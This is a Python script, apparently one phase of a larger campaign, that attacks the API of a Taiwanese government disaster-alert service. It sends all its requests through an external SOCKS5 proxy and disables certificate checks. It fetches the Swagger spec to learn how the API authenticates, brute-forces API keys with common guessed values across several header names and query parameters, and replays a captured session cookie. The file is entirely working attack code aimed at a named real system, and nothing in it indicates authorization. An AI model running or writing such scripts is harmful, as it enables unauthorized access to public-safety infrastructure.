#!/usr/bin/env python3
"""Phase 37b: Quick NCDR API key check + swagger security."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
BASE = 'https://alerts.ncdr.nat.gov.tw/AddValueApi'

# 1. Swagger security schemes
r = requests.get(f'{BASE}/swagger/v1/swagger.json', proxies=PROXY, verify=False, timeout=15)
spec = r.json()
print("=== Security Definitions ===")
sec = spec.get('securityDefinitions', spec.get('components', {}).get('securitySchemes', {}))
print(json.dumps(sec, indent=2, ensure_ascii=False))

# 2. Try API key with common header names on EventCode
print("\n=== API Key brute (optimized) ===")
key_headers = ['X-API-Key', 'apikey', 'ApiKey', 'X-Api-Key', 'Ocp-Apim-Subscription-Key']
key_values = ['test', '123456', 'admin', 'NCDR', 'AddValue', 'ncdr', 'public', 'demo',
              '0v1n35t6-3n57-t41b-3rv1-1n57v4t10n20', 'c1286275-8927-421f-9434-9f5d8f8fc4be']

for hname in key_headers:
    for hval in key_values:
        r = requests.get(f'{BASE}/EventCode', proxies=PROXY, timeout=5,
                        headers={'User-Agent': 'Mozilla/5.0', hname: hval, 'Accept': 'application/json'}, verify=False)
        if r.status_code != 401:
            print(f"  {hname}={hval} -> {r.status_code} *** FOUND ***")
            print(f"  Body: {r.text[:300]}")

# 3. Try query param
print("\n=== Query param API key ===")
for qname in ['apikey', 'api_key', 'key']:
    for qval in ['test', '123456', 'NCDR', 'AddValue']:
        r = requests.get(f'{BASE}/EventCode', proxies=PROXY, timeout=5,
                        params={qname: qval},
                        headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, verify=False)
        if r.status_code != 401:
            print(f"  ?{qname}={qval} -> {r.status_code} *** FOUND ***")
            print(f"  Body: {r.text[:300]}")

# 4. Check the cookiesession1 cookie
print("\n=== Cookie reuse ===")
r = requests.get(f'{BASE}/EventCode', proxies=PROXY, timeout=10,
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'}, 
                cookies={'cookiesession1': '678B286B8613E0DF55357C7E7F231BBF'}, verify=False)
print(f"  Cookie reuse: {r.status_code} - {r.text[:100]}")

print("\nDone.")
